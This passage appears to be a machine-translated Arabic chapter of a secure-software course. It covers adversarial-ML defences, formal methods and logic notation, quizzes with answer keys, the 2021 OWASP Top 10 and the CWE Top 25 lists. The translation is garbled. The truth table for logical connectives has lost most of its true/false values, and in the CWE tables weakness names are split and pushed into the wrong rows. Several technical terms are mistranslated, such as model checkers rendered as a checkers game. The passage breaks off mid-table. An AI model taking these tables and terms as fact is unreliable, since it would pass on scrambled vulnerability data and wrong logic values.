* *التدريب العدائي* يخلق مدخلات الخصومة ، ثم يدرب
  نموذج على تلك المدخلات. يمكن أن يؤدي ذلك إلى تحسين المتانة ، لكن يمكن للمهاجم
  ببساطة كرر هذه العملية في كثير من الأحيان أكثر من المدافع.
* *محاولات وضع العلامات الفارغة* لتدريب نموذج من المحتمل أن تكون مدخلات معينة
  الخصومة (ويجب تصنيفها على أنها نتائج "فارغة").
  مرة أخرى ، يبدو أن هذا ضعيف ضد الخصوم العازمين ، كما هو موضح
  بواسطة كارليني وفاغنر
  ("لا يمكن اكتشاف أمثلة الخصومة بسهولة:
  تجاوز عشر طرق للكشف "بقلم نيكولاس كارليني وديفيد واجنر ، 2017.)

إحدى الأدوات التي قد تكون مفيدة هي
صندوق أدوات متانة الخصومة (ART)
<https://github.com/Trusted-AI/adversarial-robustness-toolbox/wiki/>.
ذا بوست
[دمج الهجمات العدائية في خط أنابيب تدريب نموذجي ](https://developer.ibm.com/patterns/integrate-adversarial-attacks-model-training-pipeline/)،
بواسطة سينغ وآخرون ،
مثالا على كيفية دمج العلاج المضاد للفيروسات القهقرية في خط أنابيب أكبر.
ومع ذلك ، قبل استخدام أي أداة تحتاج إلى تحديد ما إذا كانت فعالة بما فيه الكفاية
لظروفك.

ML الخصومة هو مجال بحث نشط.
قبل استخدام التدابير المضادة ،
حدد ما إذا كانت الإجراءات المضادة ستكون كافية لأغراضك.
العديد من التدابير المضادة تعمل فقط ضد المهاجمين الساذجين الذين لا يفعلون ذلك
التعويض عن التدابير المضادة.
اعتمادا على أغراضك ،
قد لا يكون هناك *أي* إجراء مضاد يتصدى للمهاجمين بشكل كاف
بثقة كافية.
 وقد اقترح *العديد من* التدابير المضادة وتبين فيما بعد أنها غير كافية.
إحدى الأوراق التي تناقش كيفية تقييم التدابير المضادة هي
[نيكولاس كارليني ، أنيش أثلي ، نيكولاس بابيرنو ، وآخرون ، "حول تقييم متانة الخصومة" ، 2019-02-20](https://arxiv.org/pdf/1902.06705).
نأمل أن تكون هناك في المستقبل تدابير مضادة أفضل مع
المزيد من الثقة على مستوى الصناعة.

### الطرق الرسمية

اليوم ، يجب تطوير معظم البرامج لتكون آمنة "بشكل معقول" أو "كاف". ركزت هذه الدورة على تقنيات لمساعدتك على القيام بذلك. ومع ذلك ، إذا كان  من *الأهمية بمكان* أن  يفي برنامجك ببعض المعايير - مثل بعض معايير الأمان - فهناك نهج إضافي يجب أن تكون على دراية به: *الطرق الرسمية*.

الأساليب * الرسمية هي استخدام "تقنيات وأدوات صارمة رياضيا لمواصفات وتصميم والتحقق من أنظمة البرامج والأجهزة" *، حيث * تعني "الدقة الرياضية"  أن * "المواصفات هي بيانات جيدة التكوين في منطق رياضي وأن عمليات التحقق * الرسمية هي  استنتاجات صارمة في هذا المنطق"[إن وجدت] (*ما هي الطرق الرسمية؟[* *](https://shemesh.larc.nasa.gov/fm/fm-what.html)، بقلم ريكي دبليو بتلر). باختصار ، تطبق الطرق الرسمية الرياضيات على البرمجيات.

المزايا الكبيرة للطرق الرسمية هي:

* يمكنك القضاء على العديد من مصادر الغموض.

* يمكنك *إثبات* أن بعض الأشياء صحيحة أو خاطئة ، بالنظر إلى افتراضات معينة (ويمكنك أن تقرر ما هي الافتراضات).

العيوب الكبيرة للطرق الرسمية هي:

* غالبا ما يتطلب استخدام الأساليب الرسمية لتطوير البرامج اليوم مزيدا من الجهد.

* في كثير من الحالات ، يتطلب استخدام الأساليب الرسمية أيضا معرفة متخصصة (على سبيل المثال ، الرياضيات و / أو أدوات الطرق الرسمية المستخدمة).

يعمل الكثير من الناس على تطوير وتحسين الأدوات للتغلب على هذه العيوب.

يتم استخدام *الأساليب الرسمية * اليوم لتطوير البرامج ، على سبيل المثال:

* يستخدم المهندسون في Amazon Web Services (AWS) TLA + لتحليل الخدمات بما في ذلك خدمة التخزين البسيط (S3) المستخدمة على نطاق واسع و DynamoDB (مخزن بيانات NoSQL). لمزيد من التفاصيل ، راجع [* استخدام الأساليب الرسمية في Amazon Web Services (2014) وكيف تستخدم Amazon Web Services الأساليب الرسمية*](https://lamport.azurewebsites.net/tla/formal-methods-amazon.pdf)[* (2015) *](https://cacm.acm.org/magazines/2015/4/184701-how-amazon-web-services-uses-formal-methods/fulltext) ، بقلم كريس نيوكومب وتيم راث وفان تشانغ وبوجدان مونتيانو ومارك بروكر ومايكل ديرديوف.

* تم إثبات صحة نواة نظام التشغيل seL4 (نواة OSS).

* تم التحقق رسميا من تنفيذ s2n ل TLS / SSL من الجوانب المهمة وتحقق أيضا رسميا من تنفيذه لخوارزمية HMAC ([*الاستدلال الآلي و Amazon s2n ، *](https://aws.amazon.com/blogs/security/automated-reasoning-and-amazon-s2n/)بواسطة Colm MacCarthaigh ، 2016).

* يتم فحص العديد من بروتوكولات التشفير المقترحة باستخدام أدوات التحقق النموذجية بحثا عن عمليات الاستغلال المحتملة ، وتقوم بعض الأدوات بتضمين مناهج الأساليب الرسمية لمعالجة أنواع معينة من المشكلات ([*الحد بشكل كبير من نقاط الضعف في البرامج: تقرير إلى مكتب البيت الأبيض لسياسة العلوم والتكنولوجيا ، *](https://nvlpubs.nist.gov/nistpubs/ir/2016/NIST.IR.8151.pdf)بقلم بول إي بلاك ولي بادجر وباربرا جوتمان وإليزابيث فونج ، 2016).

* يقدم Hubert Garavel ([*الطرق الرسمية لأنظمة الكمبيوتر الآمنة والمأمونة*](https://www.bsi.bund.de/SharedDocs/Downloads/DE/BSI/Publikationen/Studien/formal_methods_study_875/formal_methods_study_875.pdf?&#95;&#95;blob=publicationFile&v=1) ، 2013) قائمة كبيرة حيث تم استخدام الأساليب الرسمية ، بالإضافة إلى مسح أوسع حول الأساليب الرسمية.

ومع ذلك ، فإن استخدام الأساليب الرسمية أثناء تطوير البرمجيات أمر غير معتاد اليوم. ولكن قد تصبح الطرق الرسمية أكثر شيوعا في المستقبل ، أو قد يطلب منك تطوير برنامج حيث يكون خطر وجود ثغرة أمنية مرتفعا للغاية. لذلك في هذا القسم سوف نقدم بعض الوعي الموجز حول الأساليب الرسمية.

قبل أن نفعل ذلك ، نحتاج إلى توضيح شيء واحد: الأساليب الرسمية تتطلب دائما افتراضات. إذا كانت الافتراضات خاطئة ، فإن استنتاجاتها لا تصمد بالضرورة. على سبيل المثال ، يمكنك إثبات أن شيئا ما صحيح إذا كانت وحدة المعالجة المركزية تعمل بشكل صحيح ؛ خطأ في وحدة المعالجة المركزية يعني أن الدليل لا يصمد في هذه الحالة. هذا لا يجعل الأساليب الرسمية عديمة الفائدة ، لأنها يمكن أن تقضي على العديد من المشاكل الأخرى ، ويمكنك اختيار ما تفترضه. ولكن من المهم أن تتذكر أنه عندما يقول شخص ما "تم إثبات شيء ما" ، فقد ثبت ذلك حقا بالنظر إلى بعض الافتراضات ... ومن المهم أن نفهم ما هي هذه الافتراضات.

#### مستويات الطرق الرسمية

بسبب الجهد الإضافي ، غالبا ما يتم تطبيق الأساليب الرسمية على مجموعة فرعية من المكونات أو الخصائص المحددة ذات الأهمية الخاصة. يمكن أيضا تطبيق الطرق الرسمية بدرجات مختلفة. هناك مصطلحات مختلفة على هذه الدرجات ، ولكن إحدى الطرق هي هذه المستويات الثلاثة:

* **المستوى 0**<br> يتم إنشاء مواصفات رسمية (أي ، يتم استخدام التقنيات القائمة على الرياضيات لوصف ما يفترض أن يفعله البرنامج بدقة). ثم يتم تطوير البرنامج بشكل غير رسمي منه. وهذا ما يسمى أحيانا *الأساليب الرسمية لايت*. يمكن أن يساعد هذا النهج في إزالة بعض الغموض.

* **المستوى 1**<br> قم بتطبيق المستوى 0 ثم قم بإثبات بعض الخصائص المحددة من ذلك أو قم بإجراء تحسين رسمي من المواصفات نحو شيء سيصبح البرنامج.

* **المستوى 2**<br>إثبات ادعاءات البرنامج بالكامل ، بما في ذلك التحقق منه ميكانيكيا. هذا يوفر أقوى النتائج ، ولكنه يتطلب أيضا أكبر جهد.

#### كيف يمكن تطبيق الرياضيات؟

هناك العديد من الطرق المختلفة لتطبيق الرياضيات، ومن ثم هناك العديد من الطرق المختلفة لاستخدام الطرق الرسمية. دعونا نلقي نظرة موجزة على بعض مفاهيم الرياضيات الشائعة المستخدمة في الطرق الرسمية.

##### التعبيرات المنطقية

الأداة المستخدمة على نطاق واسع هي فكرة التعبيرات المنطقية. هذه التعبيرات صحيحة أو خاطئة ، ويمكن أن تتضمن العديد من *الروابط المقترحة* (الاقتراح هو ببساطة شيء إما صواب أو خطأ). فيما يلي روابط مقترحة شائعة. يجب أن تكون الثلاثة الأولى مألوفة جدا بالنسبة لك ، نظرا لأن لغات البرمجة نسختها من الرياضيات ، ولكن قد يكون تدوينها الرياضي التقليدي جديدا بالنسبة لك:

1. "x و y" (رياضي "x ∧ y") صحيح إذا كان كل من x و y صحيحين ، وإلا فهو خطأ.

2. "x أو y" (رياضي "x ∨ y") صحيح إذا كان أي من x و y أو كليهما صحيحا ؛ إذا كان كلاهما خاطئا فهو خطأ.

3. "ليس x" (رياضي "¬x") صحيح إذا كانت x خاطئة ، وهي خاطئة إذا كانت x صحيحة.

4. "x→y" صحيح ** إذا كانت x خاطئة أو  إذا كانت y صحيحة ، أي أن x → y هي نفسها ((وليس x) أو y). غالبا ما يقرأ السهم على أنه "ضمني". قد يكون هذا المشغل جديدا بالنسبة لك ، لكن هذا السهم يمثل ببساطة "إذا كانت x صحيحة ، فإن y صحيحة". يطلق عليه رسميا *الآثار المادية*.

5. "x & harr;y" صحيح إذا كان x و y لهما نفس القيمة. هذا هو في الأساس "هل هذه القيم متساوية" للقيم المنطقية. يقرأ أحيانا على أنه "إذا وفقط إذا" (iff).

قد تجد أنه من الأسهل فهم الروابط من خلال النظر إلى الجدول التالي. يوضح هذا الجدول نتائج هذه الموصلات بالنظر إلى قيم الإدخال المحتملة ل x و y (في هذا الجدول T صحيح بينما F خطأ):

الروابط المقترحة

<table>
  <tr>
    <th>س</th>
     <th>ذ</th>
     <th>س ∧ ذ</th>
     <th>س ∨ ذ</th>
     <th>¬x</th>
     <th>خ→ص</th>
     <th>س & هار ؛ ص</th>
  </tr>
  <tr>
    <th> </th>
    <th> ف </th>
    <td> ف </td>
    <td> ف </td>
     ف <td>ت</td>
     <td>ت</td>
     <td>ت</td>
  </tr>
  <tr>
    <th> </th>
     ف <th>ت</th>
    <td> </td>
     ف <td>ت</td>
     <td>ت</td>
     <td>ت</td>
    <td> </td>
  </tr>
  <tr>
     ف <th>ت</th>
    <th> </th>
    <td> ف </td>
     ف <td>ت</td>
    <td> </td>
    <td> ف </td>
    <td> ف </td>
  </tr>
  <tr>
     ف <th>ت</th>
     <th>ت</th>
     <td>ت</td>
     <td>ت</td>
    <td> </td>
     ف <td>ت</td>
     <td>ت</td>
  </tr>
</table>


##### طقوم

أداة رياضية أخرى مستخدمة على نطاق واسع هي فكرة المجموعات. المجموعة هي ببساطة مجموعة غير مرتبة من العناصر ، حيث يمكن تعيين العناصر نفسها. على سبيل المثال ، إذا قلت S = {4 ، 5 ، 6} ، فهذا يعني فقط أن المجموعة S تحتوي على 3 عناصر (على وجه التحديد 4 و 5 و 6). يمكنك بعد ذلك تطبيق عمليات مختلفة على مجموعات ، على سبيل المثال:

* ترجع العملية "A ∈ B" true إذا وفقط إذا كان الجانب الأيسر A عضوا في الجانب الأيمن B. لذلك بالنظر إلى التعريف السابق ل S ، فإن "4 ∈ S" صحيح (لأن 4 عضو في S) ، بينما "7 ∈ S" خطأ (لأن 7 ليس عضوا في S).

* ترجع العملية "A⊂B" true إذا وفقط إذا كانت المجموعة A مجموعة فرعية من المجموعة B. بعبارة أخرى ، يكون A⊂B صحيحا إذا كان كل عضو في A عضوا في B أيضا. لذا فإن {4,6}⊂S صحيح ، لأن كلا من 4 و 6 أعضاء في S.

##### الكميون

أداة رياضية مستخدمة على نطاق واسع ربما لم ترها هي فكرة *الكميات*. ترجع هذه القيم صواب أو خطأ بناء على شروط معينة:

* تعبير ∀ * X * : يكون هذا صحيحا إذا وفقط إذا كان *التعبير* صحيحا دائما لجميع القيم المسموح بها ل X. إنها "حلقات" بشكل أساسي على كل قيمة يمكن أن تكون X. تقرأ ∀ (A رأسا على عقب) على أنها "للجميع". يتيح لك هذا أن تذكر بسهولة أن شيئا ما صحيح دائما.

* تعبير ∃ * X * : يكون هذا صحيحا إذا وفقط إذا كانت هناك بعض القيمة المسموح بها ل X حيث * يكون التعبير* صحيحا. تقرأ ∃ على أنها "موجود". يتيح لك ذلك بسهولة تحديد حدوث شيء ما مرة واحدة على الأقل.

هذا يعني أنه يمكنك استخدام تعبيرات مثل "∀ X (صالح (X) → well_formed (X))" لتقول "لجميع قيم X ، إذا كانت X صالحة ، فإن X جيدة التكوين" ... أو بعبارة أخرى ، إذا كانت X صالحة ، فإن X جيدة التكوين. لاحظ أن هذا التعبير بأكمله صحيح إذا كنا نناقش بيانات XML.

##### البيانات الرياضية مقابل العالم الحقيقي

يمكن استخدام البيانات الرياضية لنمذجة العالم الحقيقي ، لكن لا تخلط بين البيانات الرياضية على أنها نفس العالم الحقيقي!

على وجه الخصوص ، يمكنك بسهولة إنشاء بيانات رياضية ليست ما تعنيه حقا. على سبيل المثال ، تستخدم اللغات الطبيعية أحيانا "و" و "أو" بطريقة مختلفة عما حددناه أعلاه. هذه مشكلة خاصة بالنسبة ل "أو" ، والتي تكون صحيحة في الرياضيات والحوسبة عندما يكون كلا الجانبين صحيحين (ويعرف أيضا باسم "شامل أو") ، ولكن في اللغة الطبيعية ، يشير أحيانا إلى أن واحدا فقط سيكون صحيحا (ويعرف أيضا باسم "حصري أو"). على سبيل المثال ، في عبارة "سنذهب إلى السينما أو مسرحية الليلة" ، ربما لا يعني المتحدث أنه يمكننا القيام *بالأمرين معا*. يمكن أن يؤدي استخدام الرياضيات إلى إزالة العديد من أوجه الغموض مثل هذا ، ولكن سيتعين عليك تحديد ما إذا كان هذا التعبير هو ما *تعنيه*. الطريقة التي تم اختبارها عبر الزمن لمواجهة هذه المشكلة هي أن يقوم الآخرون بمراجعة بياناتك ومناقشة ما إذا كان هذا هو المقصود.

#### أدوات الأساليب الرسمية

هناك عدد كبير من الأدوات التي تدعم الأساليب الرسمية.

عمليا يمكن استخدام أي أداة (حتى معالج النصوص!) لالتقاط المتطلبات بطريقة رسمية صارمة. تم تصميم بعض الأدوات للقيام بذلك فقط. مثال على هذه الأدوات هو Alloy ، وهو مصمم لتسهيل التقاط المتطلبات رسميا وإجراء بعض الفحوصات السريعة.

تم تصميم بعض الأدوات أيضا للتحقق من صحة الادعاءات رياضيا. الأنواع الرئيسية هي:

* *مبرهنات النظرية *<br>تحاول هذه إثبات الأهداف بالنظر إلى الافتراضات باستخدام سلسلة من القواعد المسموح بها فقط. بعضها مؤتمت بالكامل بينما البعض الآخر تفاعلي. يمكن للأدوات التفاعلية التعامل مع المشكلات الصعبة ولكن يصعب استخدامها بشكل عام.

  * تشمل مثبتات النظرية الآلية OSS المستخدمة على نطاق واسع E و SPASS.

  * تشمل مبرهنات النظرية التفاعلية OSS المستخدمة على نطاق واسع Coq و Isabelle.

* * حل الرضا (SAT) / نظريات SAT modulo (SMT) * <br>هذه تأخذ مجموعة من المعادلات مع المتغيرات ، وتحاول العثور على مجموعة من القيم لتلك المتغيرات التي تجعل جميع المعادلات صحيحة. يتعامل محللو SAT فقط مع المتغيرات المنطقية والمعادلات المنطقية ، بينما يمكن لأدوات حل SMT التعامل مع القيم الأخرى. يستخدم بعض مديري الحزم داخليا أداة حل SAT. تشمل أدوات حل OSS SMT المستخدمة على نطاق واسع Z3 و CVC4 و Alt-Ergo-Free.

* *لعبة الداما النموذجية*<br>هذه تأخذ نموذجا وتظهر "بشكل شامل" أنه صحيح في جميع الحالات ، باستخدام العديد من حيل التحسين لجعل ذلك عمليا. مدقق نموذج OSS العام المستخدم على نطاق واسع هو Spin (الذي يدعم لغة تسمى ProMeLa). هناك أيضا العديد من أدوات فحص النماذج المصممة خصيصا لتحليل البرامج. على سبيل المثال ، CBMC هو مدقق نموذج محدد ب OSS لبرامج C و C ++ التي يمكنها التحقق من سلامة الذاكرة ، والتحقق من الاستثناءات ، والتحقق من المتغيرات المختلفة للسلوك غير المحدد ، ويدعم التأكيدات المحددة من قبل المستخدم.

* * التفسير المجرد / التنفيذ الرمزي (للبرامج) * هذه البرامج "تنفيذ" باستخدام التبسيط ذي الصلة (التفسير المجرد) أو الرموز (التنفيذ الرمزي).<br> 

هناك بعض الأنظمة التي يمكنها الجمع بين هذه الأدوات. على سبيل المثال:

* يجمع النظام البيئي Why3 / Frama-C بين مجموعة من الأدوات لإثبات صحة البرامج.

* المنطق الزمني للإجراءات + (TLA +) هي لغة مواصفات رسمية للأغراض العامة مفيدة بشكل خاص لوصف الأنظمة المتزامنة والموزعة ، ولديها مجموعة متنوعة من الأدوات الداعمة.

#### الأساليب الرسمية والمستقبل

اليوم لا تستخدم الأساليب الرسمية إلا في ظروف خاصة ، لكنها قد تصبح أكثر بروزا في المستقبل. كان هدفنا ببساطة هو إطلاعك على ذلك ، في حال قررت أنه قد يكون من المفيد متابعة المزيد في المستقبل. لا يمكنك التفكير في استخدام نهج إذا لم تسمع به من قبل.

#### اختبار 4.4: الطرق الرسمية

\>\>حدد العبارة (العبارات) الحقيقية:<<

[!x]التعبير "∀ X foo  " صحيح إذا  كان *foo* صحيحا بغض النظر عن قيمة X.

[ ] الأساليب الرسمية تقضي على الافتراضات. {{ محدد: لا على الإطلاق. أي طريقة رسمية يجب أن تبدأ ببعض الافتراضات. }}

[x] يأخذ حل الرضا (SAT) مجموعة من المتغيرات المنطقية والتعبيرات المنطقية ، ويحاول العثور على مجموعة من قيم المتغيرات المنطقية حيث تكون جميع التعبيرات المنطقية صحيحة.

[x] يأخذ مدقق النموذج نموذجا ويحاول إظهار صحته بشكل شامل في جميع الحالات.



## أهم قوائم الثغرات الأمنية

### أعلى 10 OWASP

أشرنا سابقا إلى أن هناك قائمتين مستخدمتين على نطاق واسع من نقاط الضعف "الأعلى" ، OWASP Top 10 (مع التركيز على مخاطر أمان تطبيقات الويب) و CWE Top 25. يحددون ما يعتبرونه العناصر "العليا" من حيث كونها شائعة بشكل خاص وخطيرة بشكل خاص.

نطاقاتها المختلفة تؤدي إلى العديد من الاختلافات. على سبيل المثال ، يسرد CWE Top 25 تجاوزات سعة المخزن المؤقت ، في حين أن OWASP Top 10 لا يفعل ذلك ، لأن تجاوزات سعة المخزن المؤقت هي مشكلة خطيرة شائعة في بعض المجالات (مثل الأنظمة المضمنة) ولكنها ليست شائعة في تطبيقات الويب.

فيما يلي  قائمة فئات [*OWASP Top 10*](https://owasp.org/Top10/) (إصدار 2021):

1. كسر التحكم في الوصول
2. فشل التشفير
3. حقن
4. تصميم غير آمن
5. التكوين الخاطئ للأمان
6. المكونات الضعيفة والقديمة
7. فشل تحديد الهوية والمصادقة
8. فشل سلامة البرامج والبيانات
9. فشل التسجيل الأمني والمراقبة
10. تزوير الطلبات من جانب الخادم (SSRF)


في هذه الدورة ، قمنا بتغطية جميع أفضل 10 OWASP ، في كل من  إصدارات 2017 [ و ](https://owasp.org/www-project-top-ten/2017/Top_10)2021[ ، وقمنا بتضمين مراجع تبادلية عندما فعلنا ذلك.](https://owasp.org/Top10/)

#### اختبار 4.5: OWASP أعلى 10

\>\>حدد العبارة (العبارات) الحقيقية:<<

[!x] الحقن هو خطر مدرج في 2021 OWASP Top 10.

[x] يعد التكوين الخاطئ للأمان أحد المخاطر المدرجة في قائمة أفضل 10 OWASP لعام 2021.

[ ] توجد تجاوزات المخزن المؤقت في أفضل 10 OWASP لعام 2021. {{ محدد: لا ، ومن المفهوم إذا فاتك هذا. تعد تجاوزات المخزن المؤقت شائعة جدا في الأنظمة المضمنة ، لأنها تنفذ على نطاق واسع في C و C ++ والتي توفر القليل من الحماية ضد تجاوزات سعة المخزن المؤقت. تتم كتابة معظم تطبيقات الويب بلغات برمجة أخرى تحمي من تجاوز سعة المخزن المؤقت ، وبالتالي فهي نادرة نسبيا في تطبيقات الويب. }}

### CWE أعلى 25

إليك إصدار 2021 من CWE [أخطر 25 خطأ برمجي](https://cwe.mitre.org/top25/archive/2019/2019_cwe_top25.html). تم إنشاء هذه القائمة باستخدام بيانات العالم الحقيقي ، وتحديدا ، نقاط الضعف المعروفة للجمهور مع نقاط الضعف والتعرض الشائعة (CVE) كما هو منشور في قاعدة بيانات الثغرات الوطنية (NVD) التابعة للمعهد الوطني للمعايير والتكنولوجيا (NIST) ، بما في ذلك درجات الخطورة كما تم حسابها باستخدام درجات نظام تسجيل نقاط الضعف المشترك (CVSS). تجمع هذه القائمة بين العديد من أنواع البرامج المختلفة. ما إذا كان هذا جيدا أم لا يعتمد على وجهة نظرك.

لا يوجد نظام مثالي. ومن المضاعفات أن CWEs المحددة هنا هي على مستويات هرمية مختلفة. على سبيل المثال  ، # 17 CWE-119 ([تقييد غير صحيح للعمليات داخل حدود المخزن المؤقت للذاكرة](https://cwe.mitre.org/data/definitions/119.html)) هي مجموعة شاملة لكل من # 3 * CWE-125 (قراءة خارج الحدود) و # 1 *CWE-787[](https://cwe.mitre.org/data/definitions/125.html)* * ([](https://cwe.mitre.org/data/definitions/787.html)كتابة خارج الحدود**) ، ومع ذلك فهي مدرجة جميعا هنا. ومع ذلك ، فإن هذا يوفر نهجا يمكن الدفاع عنه وتكراره لتحديد ما هو مهم.

#### أعلى 25

<table>
  <tr>
   <td>رتبة</td>
    <td>معرف</td>
   <td> اسم</td>
  </tr>
  <tr>
   <td>[1]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/787.html">سي دبليو إي-787</a></td>
   <td> الكتابة</td>
  </tr>
  <tr>
   <td>[2]</td>
    خارج الحدود <td><a href="https://cwe.mitre.org/data/definitions/79.html">سي دبليو إي-79</a></td>
   <td> تحييد غير صحيح للإدخال أثناء إنشاء صفحة الويب ("البرمجة النصية عبر المواقع")</td>
  </tr>
  <tr>
   <td>[3]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/125.html">سي دبليو إي-125</a></td>
   <td> قراءة</td>
  </tr>
  <tr>
   <td>[4]</td>
    خارج الحدود <td><a href="https://cwe.mitre.org/data/definitions/20.html">سي دبليو إي-20</a></td>
    التحقق من صحة<td>
   </td>
  </tr>
  <tr>
   <td>[5]</td> الإدخال بشكل غير صحيح<td><a href="https://cwe.mitre.org/data/definitions/78.html"> سي دبليو إي-78</a></td>
   <td> التحييد غير الصحيح للعناصر الخاصة المستخدمة في أمر نظام التشغيل ("حقن أمر نظام التشغيل")</td>
  </tr>
  <tr>
   <td>[6]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/89.html">سي دبليو إي-89</a></td>
   <td> تحييد غير صحيح للعناصر الخاصة المستخدمة في أمر SQL ("حقن SQL")</td>
  </tr>
  <tr>
   <td>[7]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/416.html">سي دبليو إي-416</a></td>
    <td>استخدم بعد مجانا</td>
  </tr>
  <tr>
   <td>[8]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/22.html">سي دبليو إي-22</a></td>
   <td> تقييد غير صحيح لاسم المسار إلى دليل مقيد ("مسار تنقل")</td>
  </tr>
  <tr>
   <td>[9]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/352.html">سي دبليو إي-352</a></td>
   <td> تزوير الطلبات عبر المواقع (CSRF)</td>
  </tr>
  <tr>
   <td>[10]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/434.html">سي دبليو إي-434</a></td>
   <td> تحميل غير مقيد للملف من النوع</td>
  </tr>
  <tr>
   <td>[11]</td>
    الخطير <td><a href="https://cwe.mitre.org/data/definitions/306.html">سي دبليو إي-306</a></td>
   <td> مصادقة مفقودة للوظيفة</td>
  </tr>
  <tr>
   <td>[12]</td>
    الحرجة <td><a href="https://cwe.mitre.org/data/definitions/190.html">سي دبليو إي-190</a></td>
   <td> تجاوز عدد صحيح أو التفاف</td>
  </tr>
  <tr>
   <td>[13]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/502.html">سي دبليو إي-502</a></td>
   <td> إلغاء تسلسل البيانات</td>
  </tr>
  <tr>
   <td>[14]</td>
    غير الموثوق بها <td><a href="https://cwe.mitre.org/data/definitions/287.html">سي دبليو إي-287</a></td>
   <td> المصادقة</td>
  </tr>
  <tr>
   <td>[15]</td>
    غير الصحيحة <td><a href="https://cwe.mitre.org/data/definitions/476.html">سي دبليو إي-476</a></td>
    مرجع<td>
   </td>
  </tr>
  <tr>
   <td>[16]</td> مؤشر NULL <td><a href="https://cwe.mitre.org/data/definitions/798.html">سي دبليو إي-798</a></td>
   <td> استخدام بيانات الاعتماد</td>
  </tr>
  <tr>
   <td>[17]</td>
    المشفرة <td><a href="https://cwe.mitre.org/data/definitions/119.html">سي دبليو إي-119</a></td>
   <td> تقييد غير صحيح للعمليات داخل حدود المخزن المؤقت</td>
  </tr>
  <tr>
   <td>[18]</td>
    للذاكرة <td><a href="https://cwe.mitre.org/data/definitions/862.html">سي دبليو إي-862</a></td>
   <td> التفويض</td>
  </tr>
  <tr>
   <td>[19]</td>
    مفقود <td><a href="https://cwe.mitre.org/data/definitions/276.html">سي دبليو إي-276</a></td>
    أذونات<td>
   </td>
  </tr>
  <tr>
   <td>[20]
   </td> افتراضية غير صحيحة<td><a href="https://cwe.mitre.org/data/definitions/200.html"> سي دبليو إي-200</a></td>
   <td> الكشف عن معلومات حساسة لجهة</td>
  </tr>
  <tr>
   <td>[21]</td>
    غير مصرح لها <td><a href="https://cwe.mitre.org/data/definitions/522.html">سي دبليو إي-522</a></td>
    بيانات الاعتماد<td>
  </td>
   </tr>
  <tr>
   <td>[22]</td> غير المحمية بشكل كاف<td><a href="https://cwe.mitre.org/data/definitions/732.html"> سي دبليو إي-732</a></td>
   <td> تعيين إذن غير صحيح للمورد</td>
  </tr>
  <tr>
   <td>[23]</td>
    الحرج <td><a href="https://cwe.mitre.org/data/definitions/611.html">سي دبليو إي-611</a></td>
   <td> تقييد غير صحيح لمرجع</td>
  </tr>
  <tr>
   <td>[24]</td>
    كيان خارجي XML <td><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918</a></td>
    <td>تزوير الطلبات من جانب الخادم (SSRF)</td>
  </tr>
  <tr>
   <td>[25]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/77.html">سي دبليو إي-77</a></td>
   <td> التحييد غير الصحيح للعناصر الخاصة المستخدمة في الأمر ("حقن الأوامر")</td>
  </tr>
</table>


#### على أعتاب

شعر مطورو CWE Top 25 أن هناك عددا من نقاط الضعف التي كانت مهمة ، لكنهم لم يتمكنوا من أن يكونوا في أعلى 25 لأنهم لم يكونوا منتشرين أو يميلون إلى أن يكونوا أقل حدة. يسمون نقاط الضعف هذه *على أعتاب*.

قد يرغب المطورون الذين يكملون اتخاذ قرارات التخفيف والمخاطر في 2021 CWE Top 25 في البحث عن نقاط الضعف الأخرى المحتملة في برامجهم. لهذه الأسباب ، يجب على مستخدمي أفضل 25 CWE لعام 2021 التفكير بجدية في تضمين نقاط الضعف الإضافية هذه في تحليلاتهم:

<table>
  <tr>
   <td>رتبة</td>
    <td>معرف</td>
   <td> اسم</td>
  </tr>
  <tr>
   <td>[26]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/295.html">سي دبليو إي-295</a></td>
   <td> التحقق من صحة</td>
  </tr>
  <tr>
   <td>[27]</td>
    الشهادة بشكل غير صحيح <td><a href="https://cwe.mitre.org/data/definitions/400.html">سي دبليو إي-400</a></td>
    استهلاك<td>
   </td>
  </tr>
  <tr>
   <td>[28]</td> الموارد غير المنضبط<td><a href="https://cwe.mitre.org/data/definitions/94.html"> سي دبليو إي-94</a></td>
    <td>التحكم غير السليم في إنشاء التعليمات البرمجية ("حقن الكود")</td>
  </tr>
  <tr>
   <td>[29]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/269.html">سي دبليو إي-269</a></td>
    إدارة<td>
   </td>
  </tr>
  <tr>
   <td>[30]</td> الامتيازات غير الصحيحة<td><a href="https://cwe.mitre.org/data/definitions/917.html"> CWE-917</a></td>
   <td> التحييد غير الصحيح للعناصر الخاصة المستخدمة في بيان لغة التعبير ("حقن لغة التعبير")</td>
  </tr>
  <tr>
   <td>[31]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/59.html">سي دبليو إي-59</a></td>
   <td> دقة ارتباط غير صحيحة قبل الوصول إلى الملف ("الرابط التالي")</td>
  </tr>
  <tr>
   <td>[32]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/401.html">سي دبليو إي-401</a></td>
   <td> فقدان تحرير الذاكرة بعد عمر</td>
  </tr>
  <tr>
   <td>[33]</td>
    فعال <td><a href="https://cwe.mitre.org/data/definitions/362.html">سي دبليو إي-362</a></td>
   <td> التنفيذ المتزامن باستخدام مورد مشترك مع مزامنة غير صحيحة ("حالة السباق")</td>
  </tr>
  <tr>
   <td>[34]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/427.html">سي دبليو إي-427</a></td>
    عنصر<td>
   </td>
  </tr>
  <tr>
   <td>[35]</td> مسار البحث غير المنضبط<td><a href="https://cwe.mitre.org/data/definitions/319.html"> سي دبليو إي-319</a></td>
   <td> نقل النص الواضح للمعلومات</td>
  </tr>
  <tr>
   <td>[36]</td>
    الحساسة <td><a href="https://cwe.mitre.org/data/definitions/843.html">سي دبليو إي-843</a></td>
   <td> الوصول إلى الموارد باستخدام نوع غير متوافق ("ارتباك النوع")</td>
  </tr>
  <tr>
   <td>[37]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/601.html">CWE-601</a></td>
    <td>إعادة توجيه عنوان URL إلى موقع غير موثوق به ("إعادة توجيه مفتوحة")</td>
  </tr>
  <tr>
   <td>[38]</td>
